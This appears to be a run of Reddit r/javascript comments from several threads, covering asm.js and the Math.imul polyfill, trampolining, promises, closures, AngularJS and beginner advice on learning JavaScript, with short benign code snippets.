You can integrate applied learning and books. I recommend picking up a programming book with a lot of exercises in it. Being able to extract the right information from written/typed documentation is essential for a programmers success. If your reading comprehension is preventing you from learning from books then you should work on your reading comprehension prior.
As TFA says, the first one can't handle big integers, so it overflows and starts returning Infinity quickly. The first form also breaks around 20,900 or so when it overflows the stack, while the second can handle bigger values of *n* with trampolining. TL;DR: The first one is more readable but doesn't scale. 
What's not to like? * Be able to create predictable performant code that easily interopts with javascript today here and now. * Be able to do the impossibly fast things that today we have to rely on being graced with performance by ever-changing heuristics of javascript engines. * Not have to wait for me javascript IDE with autocomplete and syntax highlighting to support some new language. The author seems to think that: * The world's going to stop making regular javascript faster * That people actually want to learn another language ( fuck that ).
Don't really agree with that pyramid of doom example, how the use of promises makes it flatter. He just used different indentation to prove his point. // Normal callback usage =&gt; PYRAMID OF DOOOOOOOOM asyncOperation(function(data){ // Do some processing with `data` anotherAsync(function(data2){ // Some more processing with `data2` yetAnotherAsync(function(){ // Yay we're finished! }); }); }); // Let's look at using promises asyncOperation() .then(function(data){ // Do some processing with `data` return anotherAsync(); }) .then(function(data2){ // Some more processing with `data2` return yetAnotherAsync(); }) .then(function(){ // Yay we're finished! }); 
Sure, but there are other, arguably better solutions. The stack overflow can be addressed using an iterative solution. And as you described, a decent bigint library handles the integer overflow issue (though personally I think it looks like ass in a language lacking overloaded operators). I suppose I could boil down my concerns with TFA to this: Demonstrate why it's necessary, please. What makes this better than an iterative implementation? At first glance, a recursive approach isn't necessarily better, especially not in a language that needs to be "Greenspun". 
For something like factorial, please use iteration! It will be simpler and faster than trampolining. I used it as an example so that it would be easier to understand the mechanism. Trampolining is a win when you have a more complex control flow such as a parser. Any tail call can be trampolined, not just a recursive call, so it scales in program complexity. I was saving that for a second post!
That pink theme doesn't work, space just pushes me down the page. latest Firefox
I do not believe the author understands the true intention of asm.js, rather its not for you to develop in, but for you to compile to. Most importantly it allows you to compile to it as a target and generate fast code *today*. being fast in five years time is all well and good and important for the health of javascript as a whole. but being fast right now is also important. 
I see his point. asm.js essentially is a bytecode language in JavaScript's clothing. But what he fails to see is that whether he or I like it or not, transcompilers like Emscripten and Mandreel will continue to exist and continue to be used. Transcompilers are already causing JavaScript to diverge into 2 usage camps, human-written and transcompiled. Transcompiled code will never look human-readable nor will ever work like human-written code. I don't see how continuing to ignore transcompilers will do the community any good.
what if the number can't fit in 64-bits?
Your example has nothing similar to that code. I see nested functions in both examples, but whatever.
[Always relevant](http://reallyexpressionengine.tumblr.com)
get this thing http://nodejs.org/
Awesome. Thanks for the link! But aren't there different types of .JS? I am more focused on learning AngularJS. Would these have the same file extension as regular JavaScript files, or something different? And would they be run in a different way than normal JavaScript? Thanks!
Cool. Thank you.
I'll look into that. Thank you!
I don't think that transcompilers like Emscripten and Mandreel should be ignored. JS engines should not discriminate: all kinds of JavaScript code from hand-written jQuery to the game compiled through Emscripten should improve and run faster and faster. [Small example: Octane Benchmark Suite for example already contains Mandreel generated code.] I say something different: if you think that the only way to get Emscripten generated code run fast is to use bytecode disguised as JavaScript then maybe you should not be using JavaScript at the first place? Make bytecode explicit. Allow it to evolve and grow beyond JavaScript. 
All of them are JS. AngularJS and EmberJS and the others are frameworks that are built in JS. They're like the difference between algebra and calculus -- you can't do the latter without knowing the former. In this case, you need to learn Javascript before you can even think about handling something advanced like AngularJS or EmberJS.
Angular JS is a MVW framework for javascript, which is basically a library of sorts that allows you to keep your code structured and modular when creating large scale Web apps. Honestly it sounds like you are jumping in at the deep end a bit here and should probably backtrack a bit and learn basic Web development. Sorry if that is an incorrect assumption but it is the impression I get. 
Nodejs is a server side implementation of javascript, I don't think it is what you are after. 
Interesting. So I guess I'll start with JavaScript then. Thanks for the explanation!
Yeah, I was just told to learn JavaScript before Angular. I'll definitely do that. And good sites for learning it from the start?
&gt;asm.js already requires special additions in Javascript to work, so it won't run on all browsers out there with just a performance penalty, anyways, so it's Firefox specific but without the advantage of having a better compressed encoding. Wait, what? Then what's the point? Seriously, I'd assumed the intent of asm.js was that you could effectively have bytecode that's executable as javascript as a fallback for platforms that don't support the bytecode-like execution.
Sweet. Thanks so much!
Okay, thanks for letting me know, haha.
You asked "Could I run it in Terminal any way?" Node lets you do that. Who cares what it's actually for, you can use it in terminal simply by typing "node file.js" to execute file.js. It's simple.
&gt; asm.js already requires special additions in Javascript to work I'm sorry to ask a question that I could probably find out the answer to, - I have a hard time following the asm.js stuff - but what are these features? Are these language features that means the code simply won't run, or are you referring to the need for a fast VM (IonMonkey or V8 with potential asm.js optimizations) that is needed for asm.js to make any difference?
Ever heard of [NaCl](https://developers.google.com/native-client/)? No? That's because bytecode in webpages is not something we want. We've already made that mistake with ActiveX and it took *years* for Microsoft to clean that mess up. And then Java applets, which we still suffer from. Hey, maybe Google can do better. But NaCl never had (has) the hype that asm.js is experiencing right now. Plus, Google will probably kill it like they did Google Reader. I seriously distrust their products' longevity right now. And with some of the killer features going into the Firefox nightlies just recently, I'm poised to make the switch to FF as my main browser in a few months once those changes hit the stable branch.
From Googling a bit, I see several places that claim it to be backwards compatible. I don't see any explicit statement of this in the [spec](http://asmjs.org/spec/latest/), but I'm not 100% clear on what "strict subset" means either -- they state it several times, and I'm wondering if from that they are implying that it is backwards compatible. My interpretation of it until I'm told otherwise is that asm.js takes advantage of the existing JavaScript keywords, operators and syntax -- but my thinking is that backwards compatibility doesn't necessarily follow from that. And I really wish the spec would just outright say whether asm.js can be interpreted correctly in all cases by a traditional JavaScript interpreter or not.
Oh awesome. Thanks!
It adds in special functions to the ``Math`` object that are signed 32-bit integer operations (so for instance a multiplication that goes beyond 32-bits will wrap around instead of convert to a double silently like in Javascript). It also creates a module syntax that asm.js components are passed into for your asm.js code to use while it runs, and the function doesn't automatically close over the global scope, but is instead a pure function, so its semantics are different (and it should be possible to coerce asm.js functions to behave differently when compiled in asm.js versus run in a regular Javascript engine with a shim layer written to kinda-sorta emulate its behavior). So really, asm.js code *won't* run in regular Javascript engines without a shim layer at the least, and then the semantics are still changed between the two so it wouldn't be a perfect (if slow) emulation, even.
You need to setup an IRC channel on freenode, brometheus.
asm.js module code itself runs in a normal JS engine just fine. All typing rules are specified exactly in a way to match normal JS semantics. The only thing you need is to shim things like imul that are not present in engines other than SpiderMonkey at the moment. if asm.js starts using more SpiderMonkey specific feature (BinaryData, etc) then more things will need to be polyfilled.
You're missing the special case where the automatic closure of outer scope in JavaScript functions is bypassed in asm.js, so it's possible to alter methods the asm.js code is using dynamically in JavaScript and it is not possible to do so in asm.js-capable engines. For instance, redefining that ``Math.imul`` method to behave like a 16-bit integer operation, or turning the ArrayBuffer heap into an Array-like object that inherits from Node's Buffer object type. Changing these things after instantiating your asm.js module (compiling it) won't affect run-time behavior on Firefox but will in a Chrome with the specified shim layer.
I don't understand your opposition to this. You want to enter asynchronous programming-land to avoid trampolining because... readability? The point is that this is an edge case of performance that involves careful consideration of principles of computer science. This is an algorithmic study, and complicated algorithms are (by their nature) harder to read because they're harder to _write_ because they're _solving harder problems_. 
I think it is an interesting project and like anything else will have a mixture of positives and negatives. The only thing I really take away from it at this time, as the author says who knows where this will go in the future, is that we, as a community, are experimenting and learning. Even if it does fail, we can learn from that.
Mmm incidentally I didn't see that you weren't the original commenter, jsproat. In any case my answer still stands: first, why do you want to go into parallel programming land? Second, why are you averse to a format that is much easier to apply algorithmic analysis to? I mean, are you asking an idle question? The point is that he's explaining trampolining. Sure, you can delegate trampolining to the event loop. Fine, it makes it more friendly in an environment serving lots of requests. You still have to _understand_ it. We're in a thread opened up by something like "This looks terrible, why would you ever do this," which completely missed the point that this is a somewhat complex programming construct suitable for very specific purposes. I'm assuming you meant your comment in that context. 
&gt; That's because bytecode in webpages is not something we want. We've already made that mistake with ActiveX and it took years for Microsoft to clean that mess up. And then Java applets, which we still suffer from. Bytecode is irrelevant to these problems. The key is APIs and isolation.
Nope, I was actually just addressing raganwald directly. I figured he'd already addressed the original thread sufficiently and I brought up the Event Loop mechanism because I was wondering if there was a reason why he *didn't* mention it in the article. (Maybe there's also a hard limit on the number of events that can be queued in the event loop? Maybe the performance is ridiculously bad in comparison?) It just seemed to me that mentioning how ``setTimeout`` can produce this sort of behavior, and how sufficiently complex async code is like a poorly implemented trampoline could help intermediate Javascript devs better grok the concept by analogy to what they currently write and methods they're already used to.
Fair enough.
Angular is not easy to learn without knowing javascript. A good place to start learning javascript is by working through this course. It is pretty straight forward and goes over the basics and is easy to follow. [code academy](http://www.codecademy.com/tracks/javascript)
You seem to think "bytecode" means "native code". It does not.
At this point, you should probably ask what it is you want to be learning. If you want to do visual/interactive stuff, like a game or an application, you'd build it within a browser. To do that: * make a html file, usually called 'index.html' * put a script tag within it * open it in your favourite browser (although I'd recommend Chrome, as it has the best development tools). For doing interactive websites, like Reddit or Google.com, you need a web server, and that's where stuff like 'Node.js' or 'Apache PHP' comes in. I'd look at them later. The other alternative, is that you run code in a terminal. Technically you can do more, but it's essentially it's either running in the background, or you just see text. That is where node.js can also be used; for running javascript applications which don't have any visual components. For example I wrote a JavaScript program today, which copies files into one. It has no 'front-end', no visual components, so it runs as a terminal application, using node.js. Honestly, I'd go down the option of making an index.html file, load it into Chrome, and then writing JavaScript within that. You can then start to look at things like node.js, web servers, terminal applications, and so on, once you start to understand more about programming.
asm.js requires no additions to current JS engines. Full stop. There would like no point otherwise, and that was one of the key characteristics that make it appealing. The Epic Citadel demo can run fine in Chrome, albeit at a performance penalty (albeit with some memory issues that they're working on - we were able to run it in a 64-bit Linux build).
Sorry for the delay, I've been on Daddy Duty. I may be missing something, but if I fire off a thunk asychronously with `nextTick` instead of the trampoline loop, how do I return a value?
Obfuscated code always existed on the web. There is a perfectly readable version of code compiled by emscripten - it's just in C++ instead of in JavaScript.
&gt; its not for you to develop in, but for you to compile to Which is exactly his point. If it's a "language" to compile to, why not actually design it as a bytecode rather than mash it into a "subset" of javascript?
With the ``Math.imul`` and similar extensions, you mean. I don't particularly like the proprietary extensions to the built-in objects asm.js has introduced.
Awesome. Thanks so much for that. What I'm looking to do it more of a web-development thing. I'm looking to build my own website for my images and music to go up on. I'm also going to use it with a social networking site. The site uses something called PHPfox to run, and the website needs more developers to help improve the site. They mainly use .JS, so I thought it would be a great thing to learn.
asm.js isn't very useful for the web as a whole. It's a low-level compiler target for low-level languages. There just aren't many cases where that kind of thing would be helpful. If you have some existing game/physics engine written in C and you want to get that on the web (with Java-like performance), great. But other than that? It won't do shit for your typical web application. Even the largest ones like GMail or Google Maps won't benefit from this kind of thing. They don't do lots of math. lljs (low-level JavaScript) is somewhat more plausible. It allows you to rewrite some of your hot functions ("90% of the time is spent in 10% of the code") in some weird bastard version of C, which gets compiled (by a preprocessor) to that asm.js subset. Rewriting 1-2 very hot number crunching functions in C (or something very similar to C) is something some game developers might be willing to do. The trade-off is somewhat reasonable if you absolutely need a bit more performance.
Asm.js can in all cases be interpreted using any javascript engine, that's the whole point, and that is the meaning of 'strict subset'. The actual numeric results might be slightly different in some cases due to int/double conversions. 
Where's the standard for imul? Can asm.js code compiled to expect imul run without it? The extensions to JS to get asm.js code to run on other browsers *are* proprietary in the sense that it is nonstandard and the specification and control of the future direction of the platform are controlled by a single entity. Or are you one of those people that believes Android and Ubuntu's Unity are truly FOSS projects, ignoring the reality of centralized control and lack of development transparency?
&gt;You seem to really want to attach words like "proprietary" to asm.js Right now, Math.imul is indeed a proprietary extension. It isn't part of any standard. You can't even find it in the ecmascript wiki. [Mozilla's wiki](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Math/imul) calls it "non-standard".
Here you go. Math.imul = function (a, b) { var ah = (a &gt;&gt;&gt; 16) &amp; 0xffff; var al = a &amp; 0xffff; var bh = (b &gt;&gt;&gt; 16) &amp; 0xffff; var bl = b &amp; 0xffff; // the shift by 0 fixes the sign on the high part return (al * bl) + (((ah * bl + al * bh) &lt;&lt; 16) &gt;&gt;&gt; 0); } [(Source)](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Math/imul)
&gt;Here you go. We know that a polyfill exists. /u/vvuk mentioned it [two nodes up](http://www.reddit.com/r/javascript/comments/1b77wz/why_asmjs_bothers_me/c94ijh8). Math.imul isn't part of any standard. The page you referenced also clearly states this ("non-standard").
You say asm.js doesn't support strings, but doesn't LLJS compile to asm.js *and* supports strings?
Because the code still runs in all browsers _today_.
can you explain HMM
&gt; Because the code still runs in all browsers today. Mostly. There are edge cases that have different semantics as mentioned above. Regardless, you need a shim, so you could just as easily convert any bytecode you define into javascript to run on unsupported systems (e.g. not firefox) as insert the shim. The point is it's not *really* javascript. It's a bytecode with kind-of-like javascript syntax, so why limit yourself to kind-of-like javascript syntax.
* image filters and pixel graphic operations * high power business math on datasets * real time encoding for video/audio streams * games Yah, no uses at all &lt;&lt;
I'm also clueless on this one. A quick google brought up http://en.wikipedia.org/wiki/Hidden_Markov_model. Seems like a decent chance that's what /u/JiminP meant.
There's always someone saying there's always a relevant xkcd after a relevant xkcd.
"Proprietary" and "non-standard" are not synonymous. "Proprietary" derives from the word "property" and has connotations that it will be defended against if e.g. another browser implements a compatible ``Math.imul`` extension. Javascript and HTML5 have always evolved through browsers implementing non-standard features which other browsers then also implement and tweak until all major browsers have it.
This is really cool! Source?
For my employer, I am building Hulu clone on Angular and it has been so far nonrestrictive. I have used KnockoutJS before and transition was not easy, but now, after few months of writing Angular code I must say that I don't want to develop SPA any other way. Angular might be slow when displaying thousands of items on single view/scope-since it does dirty checking on any event every time to determine whether to update view or not. I don't know whether you can consider it an "upper" limit of Angular, but bots can't scrape and index your content, of course that is a problem that comes with all JS SPA frameworks.
I guess the argument would be that in-page bytecode compilation is too much of a penalty to pay and should be at least an order of magnitude slower than asm.js is now on browsers that don't support it.
Yes. This is what I meant. :)
Under 0xf.kr/tools/rname/ * js.js : Where the HMM is defined. * train.js : The script I used with node.js to train the HMM. * hmm.txt : Where the HMM is stored. * words.txt : The list of words I used to train the HMM.
That's what [ng-cloak](http://docs.angularjs.org/api/ng.directive:ngCloak) is for.
StackOverflow.com is the best place for these kinds of questions (and answers) as the Q&amp;A will persist over a long while. I'd recommend posting and searching for issues there.
I will make a git repo after the next training is done. (Probably 12 hours later)
Any specifics you can share about performance traps to avoid? 
I guess the workaround for the dirty checking is to just avoid displaying huge datasets all at once? 
Awesome! Those insights will undoubtedly prove useful. 
Yeah. Misko always says something like this: "You are doing your UI wrong if you overwhelm user with thousand lines big table on one page."
Yeah, but for me it doesn't work so well. If I have to apply it on elements then I am better of with ng-bind because there no style that can override it and cause it to flash unexpectedly. Plus I write my binding in one place and it just works, no other hassle.
If you're into jQuery, this will take care of the "convert to label" part. $('select').change(function() { var label = $(this).children('option:selected').html(); $(this).prev().remove(); $(this).before('&lt;label&gt;' + label + '&lt;/label&gt;'); });
Wow, that's old!
Still relevant after all these years. 
thought the same. that's a video I watched literally years ago...
[I just thought this was funny](http://i.imgur.com/k8srOSi.png)
I really wish they would just add optional typing to the ecma language instead.
Thanks for the help!
This is not true - the JavaScript is just generating the HTML tags required to display the form. Use dev tools (F12) to find out what it's generating and target as per normal using DOM methods or jQuery.
Probably better to toggle a class name, e.g. class="open" on click. Click again and the class is removed.
It is never stupid to ask a question. They say if you ask a question, you only are stupid for 5 minutes, if you don't ask, you are stupid for your whole life. Good going. If you are interested, I can connect with you if you like and chat more about web development.
I didn't say "no uses", did I?
You forgot the "i" before " &lt; readings.length" in your for-loop!
Here you are: http://www.claudiocc.com/the-1k-notebook-part-ii/ Hope everything is now easier to understand.
well that's one error fixed!
Are you saying to have a function that, on click, toggles the display attribute, rather than just showing it?
Thanks for the offer. I might take you up on that a bit later, but for now I'm just trying to get the first part of my site done :)
His whole lecture series is great. Required watching for any JavaScript coder: http://yuiblog.com/crockford/
Add a { at the end of the line with the if statement on, and move the next } down a line to after the validdata.push... To see the results you will need to declare the input array, and log or something similar to see the results. 
jeez, for some reason it is hard for me to see which {} block is where. thanks a lot. It is coming along.
And this should be the top comment. Not the one pointing out its age (at least it isn't someone screaming "REPOST!")
Yeah, so rather than injecting style="display:block;" to the markup you would add class="open" to the markup. This seems better to me because then you're maintaining the separation of presentation (css) from structure (html). Plus, it easily gives you the option to change how you display the open menu in the future. You could switch to display inline-block, inline, table, etc, all without touching your javascript or html.
Thank you for your help! This makes more sense now.:)
Using multiple lines and indenting can help with that. If you follow each bracket down you can see where the block ends. for(condition) { if(condition) { do something } } 
http://jsfiddle.net/aDUa4 Your original code had the brackets screwed up in addition to missing semicolon.
ahhhhh yes. I would indent those curly brackets but with not logic behind it. It makes complete sense to line them up like that.
Thanks for the link. Helps out a ton! **edit:** another question, what is the point of the empty brackets? var valid_data = []
They you want to go down the HTML route. I'd do, so you can get the feel for writing JavaScript, and then seeing the results in a browser. You should also find out what tools the other developers on your project are using, so you can have the same setup. This include what version control, and it's probably best to use the same editor as them too (since you can ask them for help). The reality is, we could all sit here and comment on and on, about the different ways you can use JavaScript today. Most of that however, will be irrelevant to what you want to build. So first working out the specifics of what you want to do, will go a long way in helping you find the right material.
I have built large apps in both backbone and angular and I would say Angular is far superior IF you have alot of databindings. There is no problem with graphical libraries such as D3, who ever saying that is doing something wrong. Go with angular it is amazing!
It's perfectly OK to crosspost to different subreddits. The makers of Reddit decided to split up the 1 existing reddit into many sub topics instead of using tags. It was a smart move, because now you have a nice set of different subcultures on 1 site. 
This creates a new empty array. Remove them and see what happens.
Nice. Simple and clean. 
I eschew globals, but only because I want to keep my workspace (`window`) clean. My global namespace will have all sorts of garbage in it, but `window` will be tidy :)
FYI - for anyone that wishes to incorporate code coverage into their tests that _run in the browser_, istanbul is not a good choice (it can do it, but is poorly documented as to how). I recommend checking out Blanket.js or JScover to help with this. 
Programming beginner here, What is lambda? The things I find say anonymous functions, but I don't want to accept that in case it's an over-simplification. 
Opening curly brackets should be on the same line with the statement. Otherwise ASI might cause you some trouble.
Nifty. That makes complete sense!
A lambda is just an anon function, however a key property of any function is that it captures all the variables in the scope where the function is defined and makes them available when the function is evaluated later. That's called the function's closure. For example: function makeLambda(x) { return function() { return x; }; } var myfn1 = makeLambda(1); var myfn2 = makeLambda(2); console.log(myfn1()) // prints 1 console.log(myfn2()) // prints 2 (edited to clarify that closures are a property of any function, not just lambdas)
I've noticed the things he mentions since recently switching to require.js, and it's good to know I'm not just crazy. It's harder to watch vars when they're hidden away in IIFEs. Plus polluting global isn't really the problem. Polluting global is a side effect of writing messy code. However, some rules are ok to break once you understand them. I generally dont need globals, but when I use em, I don't feel bad about it.
Fun read. "Build a list without arrays or objects" would make for a great interview question to test a candidate's understanding of closures.
txt = "Accumulatedgrades" +"&lt;button onclick=AddGrade(maincourse.gradingareas[i]);&gt;" + "Add Grade" + "&lt;/button&gt;" You have the "i" inside of quotes so it is not getting evaluated as an integer. Try txt = "Accumulatedgrades" +"&lt;button onclick=AddGrade(maincourse.gradingareas[" + i + "]);&gt;" + "Add Grade" + "&lt;/button&gt;" You may still have another issue -- if so, things get kind of hairy. Let me know if you need more help.
You're mean. 
I've been a professional programmer since 1982 and I've never once needed to implement lists in the lambda calculus an/or combinatorial logic. When are you going to start asking me relevant business questions? ;-)
Even better would be ask a question about closures relevant to programs you are currently writing/maintaining and not something you just read about.
I disagree. In this case, the goal isn't to verify that the candidate understands how *your specific application* is using closures, but to verify that they understand closures as a concept and are able to leverage them in their code. To be more specific, the goal when asking a question like this is to find out if the candidate: 1. Understands the terminology 2. Has knowledge of a core feature of the primary language 3. Can explain how to leverage the feature to perform a task, even if it's contrived The goal is not to see if they could code it on the board right there.
True, but last I checked, Microsoft isn't in the business of [manhole covers](http://en.wikipedia.org/wiki/Manhole_cover#Circular_shape) :) Yes, it's a MacGyver kind of question, and it has no applicability to reality, but I think there is insight to be gained from watching someone struggle through it. Let's say you're hiring a new college graduate -- you're hiring because they have potential as a programmer, not because they have experience with your application's technology stack or extensive knowledge of your business. In this case, you don't care if a candidate has "extensive experience with jQuery" or "saw a large-scale project from inception to completion," you care if they can take the tools of the language and apply them (and if they know what tools they have at their disposal!). Watching someone struggle through this question would tell you a lot about their approach to solving problems, but nothing about their ability to implement business logic and stand up an application with common libraries. It all depends on what you're looking for.
Maybe so, but to clarify, I wouldn't expect you to write the code for this on the board. I'd expect you to verbally run through the toolbox of the language and come up with a way of making it happen. I'd expect to see your thought process unfold in the form of diagrams, re-statements of the problem, and questions. I would expect to know more about how you solve problems after watching you struggle through a contrived and completely unrealistic problem such as this.
Regardless of whether this kind of idea is practical, or a good interview question, it's nonsensical phrased that way. Functions in javascript are objects, to enforce the kind of solution you're looking for you'd have to ask for something like "Build a list without property assignment".
Phrasing an interview question is sometimes the toughest part :) Clearly what I wrote fails to convey the extent of question and constraints of the expected solution. Though I doubt a candidate would read it that way (and they'd score extra points if they did), I think the way you phrased it, although technically correct, is more confusing. How about: &gt; Construct a mechanism to manipulate a list. Your list should support adding items, fetching the first item, and fetching all of the items except the first. Your list should not store data in an Array or Object. As the data is stored in a closure, not an Array or Object, the above description is both succinct and technically correct.
JavaScript is very much object-oriented. It's just prototype-based, not class-based, which seems to confuse some people.
You can attach a function with that sub-menu item using onclick even handler. &lt;li class="sub-menu"&gt;&lt;a href="#whatever" onclick="displayContent('blockId');"&gt; Then you define the function displayContent that will show the particular block of text given its ID. 
If you shrink the window down, click Menu to show the side menu, it appears to get a little confused about what to do...
No problem. You have fun.
Closures are handy whenever you're passing a function as a parameter to another function call, like when you're defining a callback. For example if I need to increment a counter when an ajax request succeeds, I can do something like this: var successes = 0; $.get("/some/url", function() { successes += 1; }); Here's the same example without using a lambda: var successes=0; function incSuccess() { successes+=1; } $.get("/some/url", incSuccess); I think my description above was a bit misleading, closures are a property of any function in JS. Lambda's are just anonymous functions. But lambdas are often used as "lightweight functions"-- small blocks of code, with context (the closure), that can be passed around and used later.
Oh, and be careful when defining functions in loops: http://stackoverflow.com/questions/1451009/javascript-infamous-loop-problem 
Angular 'likes' to have control over the dom and so updating it outside of its context makes things messier. Generally, wrapping around jquery plugins or other third-party code is done through directives and in some of the messing around I've done with d3, the angular directive is just there for structure and the d3 code looks about the same as if it wasn't in a directive in the first place.
I agree with you, but I think people are downvoting you for failing to notice the wink I appended. My bad, I should have been more explicit about my sarcasm. I think it's terrible to make something like this the most important or only question you ask, but I certainly think there's a lot of value in discussing it, especially if you aren't hung up on them giving the canonical or "right" answer.
Thanks, and for the information of anybody who's also able to help me - I have quite a bit of programming experience (Java/C# - though those aren't really similar to JS I guess).
[superhero.js](http://superherojs.com) is a good collection of JS resources. Mostly aimed towards building large scale apps. There's a lot of good stuff there. 
Try here: http://pineapple.io/resources/tagged/javascript
I heartily agree with this, though I would suggest starting with Flanagan and then moving on to Crockford. Crockford has strong opinions about JS style that are better understood after you have a solid grasp of what is in the language. Flanagan's Definitive Guide is by far the best resource I know. It is thick and dry, but very comprehensive. I would recommend reading it all the way from the introduction to the API reference. It'll take time, but you will not regret it. Also check out the 'Crockford on JavaScript' lectures on youtube. The first one is especially insightful, and can be listened to like a podcast.
http://www.reddit.com/r/javascript/comments/fqht8/references_for_javascript_mastery/
Will check them out!
Looks nice, but the demo is horribly choppy and slow (in regard to the animation), and im on a nexus 4 + chrome. 
Not doing too well on Chrome for Android either.
http://blog.reybango.com/2010/12/15/what-to-read-to-get-up-to-speed-in-javascript/
&gt;[global variables] do not often cause problems Would you use carcinogenic toothpaste? After all, in most cases something else will kill you earlier. How about Russian roulette? Since your chance of survival is slightly higher than 5/6, it's perfectly safe, right?
First, start by submitting something legible. This is one hell of a messy looking post.
Can you make a few examples and screenshot them and post them for us? The description helps, but I'm still not exactly sure what I'm doing. Like, where does power come from? I'm laying down colored blocks with no indication of if anything is happening. edit: I see, a NOT is a source of power. So that clears up that. Still, screenshot some cool layouts you've played with? Here is [my contribution](http://i.imgur.com/4KdgiWO.png). It blinks. :)
4 spaces before each line please so it looks like real code like this
Neat, reminds me of a 2d minecraft redstone with its simplicity. The not being the power source and all that. Edit: Yep still awful at logic as ever! I sux :( Heres a blinking neon sign though! http://i.imgur.com/yndBd0G.png
Cool! Yeah, it was inspired by redstone. I've been trying to make a t-flip-flop (basically a toggle-able memory cell) for about 45 minutes, and this is what I finally came up with. http://imgur.com/RtAmJbQ Not the most space-efficient design, but it works!
A lot of times global variable naming conflicts are easily resolved (these bugs are mostly noticed and fixed within seconds, minutes at most). In standalone small / simple javascript applications, what is the biggest issue with using a global variable set in the window object? 
The goggles! They do nothing!
There's so many thing wrong with this, I'm just gonna name random things: * HTML tags should be in lowercase * Function code should be contained within brackets {} * Statements should end with semicolons ; * Document.write shouldn't be used for actual applications (unless this is for homework or something) * Onclick shouldn't be used to handle events
the biggest issue is: none. There is no issue, it's just mindless FUD. x-skeww has just no idea what's he talking about and/or just didn't bother to read the article.
Is this supposed to work in Chrome? I put down some of the same layouts people posted, but nothing happens, just dark green blocks on black.
It's not that smooth on a quad-core desktop w/Chrome either.
This is really neat! Do you know of any resources where I can learn more about constructing cool stuff with this?
What is your idea of a _tree_ in this context? Typically it's a navigational widget, aka. a _tree menu_; other times it's used to refer to a _binary tree_ data structure. This doesn't look like it's either of those... Confused on where and why one would need this? 
At least the 5 is easy. 
To be fair, my post was originally much longer, asking if someone would make a site containing all the old Javascript stuff people who've been around already know. I mean, I like Reddit and all, but is this really where we want people finding out about Douglas Crockford?
Essentially, what he said ^. In short; Angular doesn't like you manipluating the DOM directly in Controllers, which means it had to be done in a directive; this just means that you have to think about what you want to achieve a bit before starting as the structure is key.
holy fuck, these are amazing looking. good job.
Yeah they're claiming they've done some js magic which deals with all this stuff, but I don't see it at all! One article talks about Lu being a JS genius and rewriting how the js gets parsed to make it performant, but there's nothing in their demo.
Don't suppose you could get load/save via http://openkeyval.org/ into 1k? I'd actually accept more than 1k for that :-) but just in case, here's 5 extra bytes for you to do it in q="Black Green Gray Lime White Yellow".split(" "); q="#000 #080 #888 #0F0 #FFF #FF0".split(" "); 
[for the love of all that is good and holy](http://pastebin.com/)
Anybody have tutorials on how to write this stuff?
There are (better) ways of testing whether or not a candidate understands closure. Asking them to recreate native functionality is not one of those ways. If someone asked me that question, I'd ask "why?", and question to myself whether this person understands business processes, or wastes their time and mine with inane requests such as this. This is on par with, "If you were a tree, what kind of tree would you be?" You'd be better off having them explain how to develop a 'bind' method. At least then you can look for feature detection along with scope binding AND closure.
&gt;The first 90 percent of the code accounts for the first 90 percent of the development time. The remaining 10 percent of the code accounts for the other 90 percent of the development time. \- Tom Cargill
what part?
Mostly the process. I've always wondered how these work. I assume it's multiple lines being drawn? What is the math/logic to animate it? Etc... PS: Really nice job, by the way, OP. Looks great!
Cool, thanks, the Github page is scarce on info. It does look interesting, but I have a few more questions (please excuse that I haven't used Backbone much): In step 1. where you declare `treeObject`, is that the intended usage (declaring the tree statically)....or is that simply a mock of an HTML fragment? I.e. would the following be compatible? `new Backbone.TreeModel(document.body)` Also, I'm curious why you chose to go with `tagname` as opposed to `tagName`? edit: forgot to mention this d3 project that I read about a few days ago, which is mildly related to your project: [DomTree](https://github.com/breck7/domtree) (try the demo!)
Brilliant explanation, now I understand why you had the cos() and sin(). I only had time to brush over it, but I have a better understanding of it. I did C+P the javascript into jsfiddle and have a play; thanks for that. Thanks :)
It's not possible. The security model of iframes explicitly prevents this kind of interaction. To do this you would need the cooperation of the page in the iframe, and have it load the data for the form from something like the URL or the server. You might also consider just making an [XHR request](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest) that would act like the submitted form.
I have control of the iframe page. Are you suggesting I just make it a post/get variable and pass it in? That seems like it'd work, I'll give that a shot.
Or just indent it with 4 spaces. &lt;html&gt; &lt;body&gt;&lt;h1&gt;WTF&lt;/h1&gt;&lt;/body&gt; &lt;/html&gt;
I'll agree that bind would definitely be a better question to determine if they understand closures and scope binding.
mythmon is wrong. See my reply to him.
There is an error in your javascript code which is probably not helping: http://imgur.com/qW5Td2j
I'm assuming that the iframe you are referring to is on another domain? That would mean you are running in to issues with [Same Origin Policy](http://en.wikipedia.org/wiki/Same_origin_policy)
OP is not even trying
If inserted iframe is not in the same domain with parent you have no chance to make operations on inserted iframe. If they are in same domain i suggest you to get contents of the iframe (window object) with function [here](http://jsfiddle.net/mdikici/mwELh/). Also one alternative way may be using XD.js code [here](http://www.onlineaspect.com/2010/01/15/backwards-compatible-postmessage/) and post message between iframes
You have to add a semicolon before `window.onunload = ...` in styleswitcher.js.
I'll give that a try tomorrow. Thanks!
add semicolons after window.onload and window.unonload. 
Basically, you can create a CSS class `.night` and prepend it to all your selectors /* before */ .accordian { ... } /* after */ .night .accordian { ... } Then, just toggle the `.night` class on `body` when a user clicks on the clock (jQuery API example): $('#nightmode').click(function() { $('body').toggleClass('night'); });
Disclaimer, i'm the author of RedScript. I mainly created RedScript to test out and idea... let me know if you have any suggestions!
I checked out the code but it wasn't obvious to me, what kind of math and or graph related algorithms are being used here?
Here's a big discussion about this demo, from the programming sub a week ago. [simulating_cloth/](http://www.reddit.com/r/programming/comments/1ayxbr/simulating_cloth/)
It is, if nothing else, an interesting comparison of Ruby and Javascript idioms. I'm not sure whether mapping `puts` to `console.log()` is the best option, when Ruby does have a Logger class for outputting messages. Do you intend Redscript to produce Javascript that will run server-side only? Or do you have plans to expand to support interaction with the window and document on the client? If so, I think that limiting `puts` will come back to bite you.
An example could be: you click a button and it adds a class of "is-nightmode" to the &lt;body&gt;. Then in your stylesheet you could override the elements based of that class. body.is-nightmode p { color: #fff; } and etc. 
how many times is this going to be posted?
This is a goddamn cool demo, thank you
This is so kick ass! Thanks for sharing. 
